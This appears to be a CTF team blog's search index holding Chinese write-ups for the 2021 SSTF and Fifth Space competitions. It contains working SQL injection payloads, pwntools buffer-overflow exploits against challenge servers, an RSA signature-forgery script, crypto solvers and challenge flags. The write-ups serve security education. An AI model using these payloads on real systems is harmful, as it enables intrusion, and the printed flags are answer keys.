{"pages":[{"title":"","text":"战队简介 2021.8.18成立，由mumuzi、dota_st、striving、1u1u、max、enjoey、atao、v3geD4g、NN组成 时间轴记录","link":"/about/index.html"},{"title":"","text":"加载中，稍等几秒...","link":"/friend/index.html"}],"posts":[{"title":"2021SSTF-Hacker&#39;s Playground!","text":"2021三星SSTF-Hacker’s Playground! WP WEBSQLi 101payload http://sqli101.sstf.site/step2.php?id=admin'--+&amp;pw=admin SQLi 102http://sqli102.sstf.site/step3.php?searchkey=1' union select 1,1,1,1,group_concat(column_name),1,1,1 from information_schema.columns where table_name='findme'--+ SW Expert Academy题目打开是一道算法题paylaod1 ??=inc\\lude &quot;/flag.txt&quot; paylaod2 %:import &quot;/flag.txt&quot; 知识点：https://en.wikipedia.org/wiki/Digraphs_and_trigraphs RevSecure Enough附件下载分析： ├─Secure_Enough │ my_client │ out.pcap 解压得到两个文件，一个my_client,x86-x64得elf文件。一个流量包。使用IDA打开elf文件 如果运行得话，要存在一个参数。(动调得时候加上去就行）然后就是sub_1186是一个socket函数，用来唤起一个服务。port为7001 然后判断链接与否。然后返回这个句柄。接着进入sub_1784函数 进入sub_13f1函数 进入sub_1561函数进入sub_170f进入sub_1647!再看看main函数中最后一个函数sub_1a28 solution：虚拟机打开三个控制台一个打开ida64的调试服务。一个连接服务 ：nc -l 7001一个用来监听流量：tcpdump -i any port 7001 -X -A (以16进制和ascii实时打印）而根据我们上面的分析，它提供的另一个文件 ：out.pcap。我们使用Wireshark,来分析这个流量包。发现。他就是我们进行交互的时候监听的流量。所以我们跟踪tcp流。选择hex转储! 然后队友mumuzi跟我说，红色是客户端，蓝色是服务端。那我就彻底懂了这道题。那就是把这道题的状态还原到我们现在启动的服务上！根据刚才的分析，标识头为 1 然后会将 ，拼接上去。所以unk_203040的此时状态的数据为： 接下来的数据就是将unk_203060的数据进行RSA_public_encry加密存储。标识头为2，是我们服务端向客户端发送数据监听到的流量。接下来的数据就是将输入的进行RSA_public_decry加密，然后截取0x20存储到我们要得到unk_203080， 现在，三个关键的“种子”!我们都得到了，已经将此时的状态还原到题目题出题时候的初始状态这段客户端发送的数据可以用来我们还原了上面数据的一个验证。接下来最后一段服务端发送的数据就是我们的密文！我们动调的时候再恢复为解密这段数据块最后即可得到我们想要的flag。他将再客户端打印 结果： SCTF{B3_CAR3_FULL_W1T4_RAND0M} CryptoRC fourflag_enc = '624c5345afb3494cdd6394bbbf06043ddacad35d28ceed112bb4c8823e45332beb4160dca862d8a80a45649f7a96e9cb'flag_enc = bytes.fromhex(flag_enc)pl = 'RC4 is a Stream Cipher, which is very simple and fast.'enc_pl = '634c3323bd82581d9e5bbfaaeb17212eebfc975b29e3f4452eefc08c09063308a35257f1831d9eb80a583b8e28c6e4d2028df5d53df8'enc_pl = bytes.fromhex(enc_pl)cx = [a ^ b for a,b in zip(flag_enc, enc_pl)]pl = [ord(i) for i in pl]flag = ''.join( [chr(i ^ j) for i,j in zip(pl,cx)] )print(flag) SCTF{B10ck_c1pH3r_4nd_5tr3am_ciPheR_R_5ymm3tr1c} RSA101题目给了$n,e$，然后给了两个选项，可以选择一个明文进行签名，但不能是$cat,flag$,而选项$1$输入签名，验证是$cat,flag$的话执行并得到$flag$，所以目标是得到签名，但是不能直接得到，可以签名其倍数，比如设$m=cat,flag$,$s_1={(2m)}^d%n,s_2=2^d%n,则s=s_1*(s_2)^{-1}%n$。 from gmpy2 import *import base64from Crypto.Util.number import *from pwn import * p=remote('rsa101.sstf.site',1104)context.log_level='debug' p.recvuntil('n = ')n=int(p.recvuntil('\\n')[:-1],16)print(n)s=b'cat flag'n_s=long_to_bytes(2*bytes_to_long(s))b64_ns=base64.b64encode(n_s)p.recvuntil(' &gt; ')p.sendline('2')p.recvuntil('Base64 encoded command to sign: ')p.sendline(b64_ns)p.recvuntil('Signed command: ')sign_2=bytes_to_long(base64.b64decode(p.recvuntil('\\n')[:-1]))print(sign_2) p.recvuntil(' &gt; ')p.sendline('2')p.recvuntil('Base64 encoded command to sign: ')n_s=b'\\x02'b64_ns=base64.b64encode(n_s)p.sendline(b64_ns)p.recvuntil('Signed command: ')sign_1=bytes_to_long(base64.b64decode(p.recvuntil('\\n')[:-1]))print(sign_1)s=base64.b64encode(long_to_bytes(invert(sign_1,n)*sign_2%n)) p.recvuntil(' &gt; ')p.sendline('1')p.recvuntil('Signed command: ')p.sendline(s) p.recvuntil('\\n') SCTF{Mult1pLic4tiv3_pr0perty_of_RSA} Pwnbof1from pwn import *#p=process('./bof101')p=remote('bof101.sstf.site',1337)context.log_level='debug'p.recvuntil(&quot;printflag()'s addr: &quot;)print_flag=int(p.recv(14),16)success('print_flag:'+hex(print_flag))p.recvuntil(': ')p.sendline('a'*(0x90-4)+p32(0xdeadbeef)+'b'*8+p64(print_flag))p.interactive() bof2from pwn import *#p=process('./bof102')p=remote('bof102.sstf.site',1337)context.log_level='debug'elf=ELF('./bof102')p.sendlineafter('Name &gt; ','/bin/sh\\x00')p.sendlineafter(' &gt; ','a'*0x10+'b'*4+p32(elf.plt['system'])+p32(0)+p32(0x804a034))p.interactive() MiscmeLorean因为是数学家，并且对比了每组的值，发现后一位除以前一位取整之后，数字对应的ASCII处于可打印字符，因此尝试相除，得到下图发现第二行到第五行，出现最多的字母分别是CTF{于是尝试提取每组出现最多的字母，但是组合起来发现并不能阅读，于是乎想到了最小二乘法来优化，斜率即为要转换的ASCII值 #最小二乘法def least_square_method(XY): x_y=sum([i*j for i,j in XY])/len(XY) x_2=sum([i[0]*i[0] for i in XY])/len(XY) x=sum([i[0] for i in XY])/len(XY) y=sum([i[1] for i in XY])/len(XY) return (x_y-x*y)/(x_2-x*x) s=[[(148, 13024.96),(236, 19034.88),(19, 1817.0),(202, 16665.88),(2, 414.12),(41, 3643.0),(67, 5801.0),(231, 19024.74),(219, 18785.34),(214, 16921.88),(207, 18117.84),(187, 15761.0),(136, 11528.0),(0, 240.0),(85, 7295.0),(6, 723.24),(223, 19498.96),(9, 927.78),(238, 19994.0),(177, 14931.0),(130, 11250.6),(69, 5967.0)],[(159, 10955.82),(16, 1136.8),(152, 10272.0),(121, 7867.2),(190, 13587.08),(155, 10473.0),(128, 9183.84),(191, 12627.3),(149, 10272.42),(215, 14493.0),(89, 6293.04),(101, 6855.0),(233, 15699.0),(228, 15364.0),(32, 2232.0),(33, 2299.0),(1, 155.0),(81, 5294.4),(247, 16969.74),(230, 15188.04),(120, 8128.0),(243, 15714.24)],[(173, 14617.0),(237, 19593.14),(37, 3256.86),(55, 4705.0),(0, 88.4),(49, 3948.94),(21, 1922.96),(6, 589.0),(228, 19237.0),(27, 2353.0),(249, 21841.04),(245, 20251.7),(140, 12081.9),(149, 12096.96),(53, 4809.22),(114, 9661.0),(16, 1429.0),(141, 11690.42),(201, 16969.0),(238, 20077.0),(248, 20917.0),(138, 11443.46)], [(16, 1232.4),(82, 5805.0),(172, 12105.0),(150, 10565.0),(180, 12918.3),(241, 16257.6),(130, 9165.0),(74, 4930.3),(20, 1494.3),(255, 17915.0),(197, 14132.1),(198, 13368.0),(71, 5035.0),(101, 7135.0),(251, 17635.0),(220, 15465.0),(174, 12979.7),(113, 7815.5),(64, 4635.9),(114, 8045.0),(80, 5778.3),(47, 3220.8)],[(110, 13802.64),(5, 617.0),(250, 31982.08),(147, 18083.0),(9, 1175.54),(24, 2835.84),(159, 19559.0),(181, 21819.7),(243, 30488.82),(53, 6521.0),(72, 8858.0),(112, 13502.44),(71, 8735.0),(23, 2831.0),(191, 24434.8),(254, 29994.24),(44, 5738.84),(209, 25194.82),(3, 371.0),(199, 24479.0),(99, 12179.0),(146, 17600.8)],[(9, 926.0),(202, 16366.0),(104, 8526.0),(143, 11180.16),(180, 14606.0),(164, 13059.48),(138, 11695.84),(51, 4286.0),(205, 16938.12),(123, 9845.08),(22, 2005.32),(33, 2675.24),(223, 18767.84),(179, 14526.0),(194, 15726.0),(200, 15557.76),(72, 5966.0),(24, 2126.0),(189, 15326.0),(217, 16512.04),(12, 1189.32),(112, 8982.68)],[(151, 17331.0),(145, 15648.18),(7, 951.6),(183, 20979.0),(192, 22885.2),(130, 14339.52),(120, 13797.0),(220, 24693.06),(208, 24782.16),(146, 16425.78),(207, 24189.3),(83, 9579.0),(11, 1371.0),(255, 28603.26),(189, 21663.0),(14, 1713.0),(241, 27591.0),(39, 4289.22),(166, 19041.0),(195, 21900.06),(35, 4189.14),(173, 19839.0)],[(141, 7182.24),(221, 10746.0),(254, 12576.6),(145, 7098.0),(162, 8072.28),(54, 2566.2),(107, 5379.48),(147, 7050.12),(7, 492.96),(252, 11744.64),(180, 8953.56),(168, 8202.0),(95, 4698.0),(146, 6717.24),(27, 1434.0),(199, 9690.0),(1, 186.0),(144, 7050.0),(72, 3594.0),(5, 362.88),(220, 10698.0),(108, 5215.56)],[(27, 3148.08),(39, 4092.48),(116, 12925.64),(149, 15593.0),(188, 20394.4),(155, 16211.0),(122, 13068.24),(245, 24971.38),(251, 26099.0),(68, 7105.0),(193, 20125.0),(249, 25375.14),(183, 19095.0),(50, 5396.0),(83, 8795.0),(174, 17804.64),(173, 18426.3),(220, 22906.0),(199, 21572.72),(114, 11988.0),(52, 5602.0),(145, 14270.14)],[(158, 19279.28),(77, 8954.0),(165, 18986.0),(160, 18047.68),(124, 14884.48),(208, 23888.0),(60, 7016.0),(164, 18117.12),(201, 23090.0),(91, 10550.0),(106, 12505.2),(141, 16250.0),(223, 26109.96),(219, 24136.32),(18, 2228.0),(103, 11918.0),(225, 26342.52),(122, 13238.96),(140, 16781.44),(65, 7586.0),(200, 23435.52),(13, 1624.84)],[(34, 3532.0),(83, 7972.14),(49, 5248.88),(127, 12666.5),(180, 18278.0),(225, 22823.0),(162, 16460.0),(229, 23227.0),(212, 21940.2),(223, 21716.16),(232, 24000.6),(178, 17714.48),(90, 9188.0),(32, 3330.0),(143, 15413.46),(255, 25335.94),(163, 16892.22),(110, 11208.0),(1, 199.0),(211, 21409.0),(128, 13547.04),(117, 11438.4)],[(161, 8678.0),(244, 13077.0),(13, 834.0),(91, 4868.64),(153, 8419.08),(80, 4121.9),(216, 12056.72),(178, 9387.42),(49, 2742.0),(237, 11943.64),(142, 7671.0),(68, 3749.0),(234, 12547.0),(163, 8432.64),(23, 1391.28),(133, 7194.0),(179, 10017.28),(121, 6558.0),(115, 6240.0),(93, 4972.52),(139, 7662.24),(184, 9501.12)],[(236, 12636.0),(98, 5109.12),(135, 7574.32),(9, 605.0),(249, 13591.5),(82, 4205.56),(24, 1456.0),(52, 2884.0),(101, 5481.0),(159, 8383.9),(129, 6965.0),(235, 12583.0),(210, 11258.0),(222, 11894.0),(106, 5860.92),(42, 2354.0),(102, 5644.68),(65, 3573.0),(191, 10866.06),(7, 489.02),(178, 9753.24),(186, 9586.56)],[(172, 16709.64),(56, 5147.52),(128, 12202.0),(136, 12184.28),(133, 13184.08),(222, 21132.0),(205, 19907.34),(29, 2797.0),(53, 5077.0),(140, 13342.0),(80, 7794.84),(188, 17902.0),(168, 16002.0),(167, 15270.72),(39, 3971.82),(131, 11987.52),(7, 707.0),(134, 12516.56),(162, 15432.0),(92, 8606.36),(91, 8687.0),(198, 18474.96)],[(250, 19107.92),(64, 4795.0),(103, 7642.0),(132, 9759.0),(252, 18519.0),(78, 5817.0),(15, 1218.0),(80, 5843.74),(52, 4075.76),(212, 14663.06),(155, 11666.76),(234, 16516.8),(95, 7058.0),(152, 10994.62),(117, 8837.28),(101, 7046.24),(184, 13826.1),(177, 12783.12),(7, 634.0),(151, 11146.0),(156, 11971.44),(62, 4649.0)],[(128, 14229.0),(94, 9859.66),(87, 10107.76),(251, 26648.64),(52, 5986.38),(216, 23430.82),(221, 25437.36),(63, 7079.0),(222, 24569.0),(137, 14610.24),(115, 13054.98),(66, 7260.82),(134, 15186.78),(224, 24789.0),(203, 22479.0),(245, 27099.0),(39, 4439.0),(93, 10379.0),(225, 24899.0),(149, 16208.22),(205, 24060.94),(69, 7739.0)],[(206, 19714.0),(183, 17529.0),(31, 3089.0),(115, 10847.62),(140, 13444.0),(252, 22638.96),(203, 20206.16),(129, 11655.06),(181, 17339.0),(174, 16340.52),(170, 16945.76),(186, 17457.72),(187, 17909.0),(40, 3865.12),(37, 3659.0),(255, 24369.0),(232, 23071.36),(35, 3469.0),(192, 19119.36),(141, 13268.22),(0, 146.88),(60, 5844.0)],[(200, 16475.0),(177, 14589.0),(191, 16366.48),(31, 2617.0),(125, 10531.5),(17, 1469.0),(56, 4667.0),(6, 544.32),(87, 7353.18),(157, 12172.06),(33, 2836.62),(176, 14507.0),(106, 9293.02),(242, 19919.0),(4, 403.0),(26, 2207.0),(169, 13933.0),(46, 3770.06),(127, 10908.56),(23, 1882.56),(126, 10615.14),(95, 7707.7)],[(196, 10456.02),(149, 7854.0),(32, 1924.74),(146, 7392.96),(144, 7599.0),(57, 2972.28),(227, 11832.0),(153, 8058.0),(61, 3567.96),(126, 6681.0),(71, 4031.04),(2, 349.86),(115, 6120.0),(28, 1683.0),(86, 4733.82),(169, 8696.52),(222, 11577.0),(33, 1899.24),(44, 2598.96),(241, 12546.0),(74, 4190.16),(159, 8364.0)],[(32, 3539.12),(230, 23797.0),(219, 23570.56),(229, 23220.12),(216, 22802.1),(218, 22109.78),(80, 8680.88),(251, 25960.0),(128, 13291.0),(121, 12318.6),(133, 13806.0),(253, 26166.0),(122, 12673.0),(136, 13832.7),(105, 10922.0),(31, 3300.0),(70, 7463.34),(144, 14341.44),(182, 18853.0),(123, 12009.44),(111, 11540.0),(16, 1649.7)],[(235, 27034.0),(125, 14494.0),(204, 23500.0),(182, 19732.48),(197, 22702.0),(151, 17108.84),(107, 12442.0),(4, 686.0),(220, 25830.48),(131, 14570.88),(173, 19966.0),(61, 7198.0),(56, 6628.0),(216, 23873.28),(176, 21526.48),(109, 12670.0),(67, 8039.64),(251, 28280.84),(211, 25269.92),(72, 8282.96),(156, 18749.12),(101, 11758.0)],[(247, 12712.0),(233, 11518.08),(218, 11233.0),(55, 2920.0),(185, 9550.0),(189, 9754.0),(255, 13382.4),(222, 10979.52),(231, 12133.92),(204, 10519.0),(212, 11582.62),(176, 9091.0),(68, 3583.0),(53, 2818.0),(243, 12758.16),(246, 12407.78),(155, 8340.8),(112, 5593.92),(135, 7000.0),(73, 3607.72),(121, 6411.72),(173, 8759.24)],[(98, 11699.4),(101, 11815.0),(25, 3136.5),(135, 15725.0),(75, 8825.0),(3, 512.3),(96, 11464.8),(74, 8710.0),(30, 3650.0),(243, 28145.0),(73, 8938.8),(32, 3724.8),(204, 24606.4),(251, 28483.7),(122, 14230.0),(145, 16875.0),(174, 20614.2),(200, 22736.0),(111, 13483.6),(53, 6295.0),(255, 29525.0),(47, 5268.7)],[(7, 1063.18),(118, 13768.0),(249, 28833.0),(163, 18185.28),(254, 29996.16),(116, 13267.24),(154, 17908.0),(17, 2066.88),(89, 10850.32),(21, 2560.74),(86, 10491.52),(238, 27568.0),(62, 7767.68),(156, 17775.24),(95, 11123.0),(75, 8646.54),(229, 26533.0),(113, 13193.0),(80, 9398.0),(146, 16648.24),(226, 26188.0),(153, 17793.0)],[(39, 5104.0),(124, 15729.0),(80, 10229.0),(122, 14550.26),(168, 21229.0),(159, 20104.0),(52, 6729.0),(16, 2095.26),(7, 1148.16),(99, 12604.0),(43, 5828.16),(35, 4511.92),(115, 14604.0),(236, 29134.42),(51, 6736.08),(176, 22229.0),(255, 32104.0),(6, 939.84),(200, 25733.58),(138, 17129.42),(143, 18828.16),(146, 18109.42)]]f=[]for i in s: f.append(least_square_method(i))print(f)print(''.join([chr(round(i)) for i in f]))#SCTF{Pr0gre55_In_R3gr3ss} flag:SCTF{Pr0gre55_In_R3gr3ss} Mars Rover首先拖进010看IDAT块长度，发现都比较短，提取出IDAT长度尝试转换为字符，但是并没有发现flag痕迹，接着用tweakpng查看CRC，发现前面很多的CRC尾部都是20结尾，并且后面有的CRC不是20，所以尝试提取CRC的最后一位来转换为字符 flag = ''f = open(&quot;MarsRover.png&quot;,'rb').read()i=0while i &lt; len(f): if(f[i:i+4] == b'IDAT'): for j in range(i+1,len(f),1): if(f[j:j+4] == b'IDAT'): #print(f[j-5]) if(f[j-5]&gt;32): flag += chr(f[j-5]) i += (j-i-2) break i+=1print(flag)","link":"/posts/53053/"},{"title":"2021第五空间大赛WP","text":"2021第三届第五空间网络安全大赛WP 成绩第十九名 PwnbountyhunterIda查看发现栈溢出漏洞，有system，有’/bin/sh’ Checksec from pwn import *#p=process('./pwn')p=remote('139.9.123.168',32548)elf=ELF('./pwn')#gdb.attach(p,'b *0x4011AA')p.sendlineafter('Who are you? What do you want?\\n','a'*0x90+'b'*8+p64(0x0000000000401016)+p64(0x000000000040120b)+p64(0x403408)+p64(elf.sym['system']))p.interactive() 个人信息保护data_protection题目分5问。 $n$比较小，factordb上面可以直接找到分解； $p$已知，而且明文小于$p$。直接模$p$分析，$\\varphi(p)=p-1$即可； 模$p$下给了一个线性方程组，直接解即可； 前面已经生成了642个随机数，但是部分随机数的具体值未知，需要爆破 这些未知的随机数具体包括： 第1问的$a$和$b$，值介于$p$和$q$，并且$a$和$b$生成的先后顺序不确定； 第2问的$q$，值介于$p$和$p+2^{31}$，还有一位不确定。 已知624个随机数，就可以恢复随机种子，进而求出AES密钥。然后根据题目已知信息尝试解密成明文检验明文是否合法。 接第4问已知随机种子可以求出DH算法的私钥$x, y$，进而求出DH算法的shared secret $s$。乘以$s$的模逆即可。 这关键就在4.需要科学爆破一下然后就是附上exp: e1.py from Crypto.Util.number import *with open('out') as f: s = f.read().splitlines()c = eval(s[0])n = eval(s[1])p = 22186905890293167337018474103q = 64390888389278700958517837593e = 65537d = inverse(e, (p-1)*(q-1))m = pow(c, d, n)print(long_to_bytes(m))# xiaoMing e2.py from Crypto.Util.number import *with open('out') as f: s = f.read().splitlines()c = eval(s[2])n = eval(s[3])p = 11616788973244169211540879051135531683500013311175857700532973853592727185033846064980717918194540453710515251945345524986932165003196804187526561468278997e = 65537q = n // pdp = inverse(e, (p-1))m = pow(c, dp, p)print(m.bit_length())print(p.bit_length())print(long_to_bytes(m))# 14115102907 e3.sage with open('out') as f: s = f.read()s = s.splitlines()q = eval(s[4])A = eval(s[5])b = eval(s[6])A = Matrix(Zmod(q), A)b = vector(Zmod(q), b)x = A.solve_right(b)x = ''.join([chr(i) for i in x])print(x)# xiaoMing@amail.com e4.py import randomfrom Crypto.Util.number import *from Crypto.Cipher import AESfrom randcrack import RandCrackimport stringimport itertoolsfrom tqdm import tqdmimport picklewith open('out') as f: s = f.read().splitlines()c4 = eval(s[7])c4 = long_to_bytes(c4)ok_char = string.ascii_letters + string.digits + '._'ok_char = list(ok_char.encode())p1 = 22186905890293167337018474103q1 = 64390888389278700958517837593n2 = eval(s[3])p2 = 11616788973244169211540879051135531683500013311175857700532973853592727185033846064980717918194540453710515251945345524986932165003196804187526561468278997offset2 = n2 // p2 - p2with open('out') as f: s = f.read().splitlines()s = eval(s[5])s = [x for y in s for x in y]append_2 = b'\\xf1\\x0f\\xb5\\xb5\\xae\\xf0\\x05\\x92BWR\\xd0&gt;\\x91\\x0cv\\xbc ]\\x81'append_2 = bytes_to_long(append_2)def my_submit(rc, x, t): for i in range(t): rc.submit(x % (1 &lt;&lt; 32)) x &gt;&gt;= 32for a1, b1 in [[p1, q1], [q1, p1]]: aleft = a1 - 1 while (not isPrime(aleft)): aleft -= 1 bleft = b1 - 1 while (not isPrime(bleft)): bleft -= 1 for aa, bb, o2 in tqdm(itertools.product(range(aleft, a1)[::-1], range(bleft, b1)[::-1], range(2))): rc = RandCrack() my_submit(rc, aa, 3) my_submit(rc, bb, 3) my_submit(rc, append_2, 5) off2 = 2 * offset2 + o2 my_submit(rc, off2, 1) for i in s: rc.submit(i) key = rc.predict_getrandbits(128) key = long_to_bytes(key, 16) cipher = AES.new(key, AES.MODE_ECB) m = cipher.decrypt(c4) if (all(x in ok_char for x in m)): print(m) print() print(aa) print(bb) print(off2) exit(0)# No.123_doge_road e5.py from Crypto.Util.number import *from Crypto.Cipher import AESfrom randcrack import RandCrackaa = 22186905890293167337018474102bb = 64390888389278700958517837515off2 = 3288350018with open('out') as f: ss = f.read().splitlines()s = eval(ss[5])c4 = eval(ss[7])c4 = long_to_bytes(c4)s = [x for y in s for x in y]append_2 = b'\\xf1\\x0f\\xb5\\xb5\\xae\\xf0\\x05\\x92BWR\\xd0&gt;\\x91\\x0cv\\xbc ]\\x81'append_2 = bytes_to_long(append_2)def my_submit(rc, x, t): for i in range(t): rc.submit(x % (1 &lt;&lt; 32)) x &gt;&gt;= 32rc = RandCrack()my_submit(rc, aa, 3)my_submit(rc, bb, 3)my_submit(rc, append_2, 5)my_submit(rc, off2, 1)for i in s: rc.submit(i)key = rc.predict_getrandbits(128)key = long_to_bytes(key, 16)cipher = AES.new(key, AES.MODE_ECB)m = cipher.decrypt(c4)print(m)q, g, h = [eval(x) for x in ss[8].split()]c1, c2 = [eval(x) for x in ss[9].split()]gg = rc.predict_randrange(q-1)print(g == gg)x = rc.predict_randrange(q-1)y = rc.predict_randrange(q-1)s = pow(g, x*y, q)m5 = c2 * inverse(s, q) % qprint(long_to_bytes(m5))# Make666GreatAgain_University finexp.py from hashlib import sha256name = b'xiaoMing'phone = b'14115102907'mail = b'xiaoMing@amail.com'address = b'No.123_doge_road'school = b'Make666GreatAgain_University'flag = 'flag{'+sha256(name).hexdigest()[:8]+'-'+sha256(phone).hexdigest()[:4]+'-'+sha256(mail).hexdigest()[:4]+'-'+sha256(address).hexdigest()[:4]+'-'+sha256(school).hexdigest()[:12]+'}'print(flag)##flag{073fa53e-4246-dd1d-54a0-0c268444ad09} Cryptodoublesage模$p$意义下求$x$使得范数$|xA-C|$小这个问题在一般的实数域内就对应伪逆 pseudoinverse A^{+}对于方程$Ax=b$，利用伪 逆$A^{+}$，我们可以求得$x=A^{+}b$，这个$x$就是使得$|Ax-b|$最小的那个$x$。回到问题。上式求转置即为：$$A^T x^T - C^T$$所以只需要求得$A^T$的伪逆，再乘上$C^T$即可得到$x$的值。然后可能单次尝试不能通过检验，需要多次尝试，就能通过检验。exp: from pwn import *from sage.all import *def gao_problem(p, p, rows): p.recvuntil('Matrix A') p.recvline() def get_vector(p): p.recvuntil('[') s = p.recvuntil(']')[:-1] return [int(x) for x in s.split()] A = [] for i in range(rows): s = get_vector(p) A.append(s) p.recvline() b = p.recvline() b = get_vector(p) Zp = Zmod(p) A = Matrix(Zp, A) b = vector(Zp, b) x = A.transpose().pseudoinverse() * b print(x * A) print(b) x = str(x).replace('(', '[').replace(')', ']') p.sendline(x) p.recvuntil('The norm of vector x*A-C is') res = p.recvline() if (b'True' in res): print('Pass chall {}'.format(p)) return True else: print('Fail chall {}'.format(p)) return Falsewhile True: #p = process(['sage', 'another.sage']) p = remote('122.112.210.186',51436) if gao_problem(p, 29, 5) and gao_problem(p, 227, 15): p.interactive() else: p.close() 当然，由于该需要exp需要sage.all库，因此我们需要在sagemath上或者也可以用cocalc在线跑一下。 secrets题目需要求32位的$p_1, p_2, p_3$使得$$a_1 p_2 p_3 + a_2 p_1 p_3^2 + a_3 p_1 p_2^2 p_3 \\equiv n \\ (\\bmod p)$$ 格基规约。首先我们要让某个线性组合变成一个小值。我们看上了$p_2 p_3$这一项。于是同余式两边乘上$a_1^{-1}$：$$p_2 p_3 + a_1^{-1} a_2 p_1 p_3^2 + a_1^{-1} a_3 p_1 p_2^2 p_3 \\equiv a_1^{-1} n \\ (\\bmod p)$$写成等式：$$p_2 p_3 + a_1^{-1} a_2 p_1 p_3^2 + a_1^{-1} a_3 p_1 p_2^2 p_3 = a_1^{-1} n + kp$$移项：$$p_2 p_3 = a_1^{-1} n - a_1^{-1} a_2 p_1 p_3^2 - a_1^{-1} a_3 p_1 p_2^2 p_3 + kp$$便有以下格：$$\\begin{bmatrix}1 &amp; p_1 p_3^2 &amp; p_1 p_2^2 p_3 &amp; k\\end{bmatrix}\\begin{bmatrix}n &amp; 1 &amp; 0 &amp; 0 &amp; 0 \\-a_1^{-1} &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\-a_1^{-1} a_2 &amp; 0 &amp; 0 &amp; 1 &amp; 0 \\p &amp; 0 &amp; 0 &amp; 0 &amp; 1 \\\\end{bmatrix}=\\begin{bmatrix}p_2 p_3 &amp; 1 &amp; p_1 p_3^2 &amp; p_1 p_2^2 p_3 &amp; k\\end{bmatrix}$$右乘一个平衡的对角阵之后用LLL就可以求出$(p_2 p_3, p_1 p_3^2, p_1 p_2^2)$的值，从而求出$(p_1, p_2, p_3)$然后求出AES密钥并且解密。具体解题思路： 用sage求出p2p3 p1p3^2 p1p2^2p3 sage p = 11679673793673506009014468475228106603081916890883486457896646429223178797758973615616012286356332520190126233017400893207593826175343702713785184522338787a1, a2, a3 = [5756069086948558901324622226613545219570714553931419680091355546860288277733528684484679434350356392958470286317659356659575912829589095426942951584457183, 5460203359401780189277241557890921761977539358779669504676049669202545991278492450421493921244274437911819362776150796839590850454405186576054578519831639, 5733215264737754744921226160962972135334918697201206464452013241762591234783172108441892372068592924627684842613967215477538096712289370260146873046574651]e = [[0, 1, 1], [1, 0, 2], [1, 2, 1]]n = 954454001962944951493670572521755832608771383398769255721246850106731347064788730658352434771777089459134929238824940227065118832204119439793656116218597c = '19bc72bc5f28141419994d237c84f314d9343e775722521b1eb369cb4fb5fa85'c1 = inverse_mod(a1, p) * nc2 = -a2 * inverse_mod(a1, p) % pc3 = -a3 * inverse_mod(a1, p) % pc4 = pweights = [2^(512-64), 2^512, 2^(512-96), 2^(512-128), 1]M = Matrix(ZZ, [[c1, 1, 0, 0, 0], [c2, 0, 1, 0, 0], [c3, 0, 0, 1, 0], [c4, 0, 0, 0, 1]]) * diagonal_matrix(weights) v = M.LLL()[0]p2p3 = v[0] // weights[0]p1p32 = v[2] // weights[2]p1p22p3 = v[3] // weights[3]print(p2p3)print(p1p32)print(p1p22p3) factordb查分解 弄出p1 p2 p3具体值 from z3 import *p1, p2, p3 = Ints('p1 p2 p3')sol = Solver()sol.add(p2 * p3 == 13661139160116902777)sol.add(p1 * p3 ** 2 == 29300368481521898734987896109)sol.add(p1 * p2 ** 2 * p3 == 145206870370195317357010045446286801073)if (sol.check() == sat): print(sol.model())else: print('GG simida') 把p1 p2 p3具体值填到finexp.py得到最后的flag finexp.py import random, hashlibfrom Crypto.Util.number import *from Crypto.Cipher import AESp1 = 2607953941p2 = 4075682389p3 = 3351865493secrets = [p1, p2, p3]c = '19bc72bc5f28141419994d237c84f314d9343e775722521b1eb369cb4fb5fa85'c = bytes.fromhex(c)key = hashlib.sha256(str(secrets).encode()).digest()cipher = AES.new(key, AES.MODE_ECB)flag = cipher.decrypt(c)print(flag)# flag{f6c279906556477981c0698e6239982e} signin题目给出$n=pq$以及$x = (p \\oplus q) \\bmod 2^{400}$，需要求n的分解 RSA+xor，从低位到高位枚举分析。也就是依次模$2^1, 2^2, \\ldots, 2^{400}$进行分析。每次枚举$p, q$的高位并且利用$n$和$x$进行验算。这样到400位，就可以求出若干$p, q$的低400位。然后对于每个可能的低位$p$，构造多项式$$f(x) = 2^{400} x + p$$并用Coppersmith small root求解$x$，进而得到$p$，也就得到了$n=pq$的分解之后就算得解密指数$d$，解密密文即可。 e1.py from sage.all import *from tqdm import tqdmc = 51527129112041727084653138724362414261275943766050564614480874091504860204252606590600308110384082623259378144308474054746140923358753034723604762350226880256680349452009792177706794254189892857145865023696386031044387376465031791954744691766962599322069213009628794080376529614779412009851632855178036285523e = 65537n = 116652897843293883441819903375596603379518724751574619124014296798496676038791377773876686025057284152512331129032274361942198246462102132225928556778732123779685850832525256744533855512548226749675828320075447142642844219402725358384766251737244370235962898005154181991761923091468959986835373399473596976197x = 471475951883841996380755394497425485938102193317354065361151516006175011110693734273770491686812217784012615381122407908pre_sol = [(1, 1)]for i in tqdm(range(1, 400)): cur_pow = (1 &lt;&lt; (i+1)) cur_sol = [] for pre_p, pre_q in pre_sol: for s in range(2): for t in range(2): cur_p = pre_p + s * (1 &lt;&lt; i) cur_q = pre_q + t * (1 &lt;&lt; i) if (cur_p ^ cur_q == x % cur_pow and cur_p * cur_q % cur_pow == n % cur_pow): cur_sol.append((cur_p, cur_q)) pre_sol = cur_solF, x = PolynomialRing(Zmod(n), name='x').objgen()print(F)print(x)for p, q in tqdm(cur_sol): f = x * 2 ** 400 + p f = f.monic() sol = f.small_roots(X = 2 ** 112, beta = 0.4) if (sol != []): print(sol[0] * 2 ** 400 + p) break e2.py from Crypto.Util.number import *p = 12172529005716175430901283903834642726755657633565845783363589139718811888175215203727237853050161503063968274652006993195449591640852850585439495172789713c = 51527129112041727084653138724362414261275943766050564614480874091504860204252606590600308110384082623259378144308474054746140923358753034723604762350226880256680349452009792177706794254189892857145865023696386031044387376465031791954744691766962599322069213009628794080376529614779412009851632855178036285523e = 65537n = 116652897843293883441819903375596603379518724751574619124014296798496676038791377773876686025057284152512331129032274361942198246462102132225928556778732123779685850832525256744533855512548226749675828320075447142642844219402725358384766251737244370235962898005154181991761923091468959986835373399473596976197q = n // pd = inverse(e, (p-1)*(q-1))m = pow(c, d, n)print(long_to_bytes(m))##flag{f092l9er-hgmj-lw5q-5d52-hwayzk6n5joj} ecc直接梭。。。 p = 146808027458411567A = 46056180B = 2316783294673E = EllipticCurve(GF(p),[A,B])P=E(119851377153561800 , 50725039619018388)Q=E (22306318711744209 , 111808951703508717)print(discrete_log(Q,P,operation='+'))#13566003730592612 用题目给的代码梭。。。 p = 1256438680873352167711863680253958927079458741172412327087203 A = 377999945830334462584412960368612B = 604811648267717218711247799143415167229480E = 